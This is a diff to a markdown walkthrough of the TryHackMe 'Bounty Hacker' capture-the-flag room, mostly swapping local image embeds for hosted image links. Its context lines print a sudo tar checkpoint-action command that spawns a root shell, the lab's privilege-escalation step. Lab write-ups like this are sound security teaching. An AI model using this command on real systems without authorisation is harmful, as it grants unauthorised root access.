@@ -1,4 +1,5 @@
-![[9ad38a2cc31d6ae0030c888aca7fe646.jpeg]]
+![9ad38a2cc31d6ae0030c888aca7fe646](https://user-images.githubusercontent.com/80511498/147251011-a47f9804-889c-483b-8e56-1bb0964e11e0.jpeg)
+
 tryhackme - bounty hacker [easy] https://tryhackme.com/room/cowboyhacker
 
 ## NMAP SCAN
@@ -146,12 +147,15 @@ ___
 
 *i searched more on tar sudo privilege escaltion and found this*
 
-![[68747470733a2f2f692e696d6775722e636f6d2f41397a70647a6e2e706e67 1.png]]
 
 just run the following command 
 command :- sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
+![68747470733a2f2f692e696d6775722e636f6d2f41397a70647a6e2e706e67](https://user-images.githubusercontent.com/80511498/147251386-5d178b8c-1a21-4590-90d1-fde988fe1ecc.png)
+
+
 now we have a root access you can see by typing :- sudo -l
+![68747470733a2f2f692e696d6775722e636f6d2f633845557361732e706e67](https://user-images.githubusercontent.com/80511498/147251202-77aa7dce-db3a-4829-a758-fba7623e3173.png)
 
 cd into /root to get to the root flag
 ___
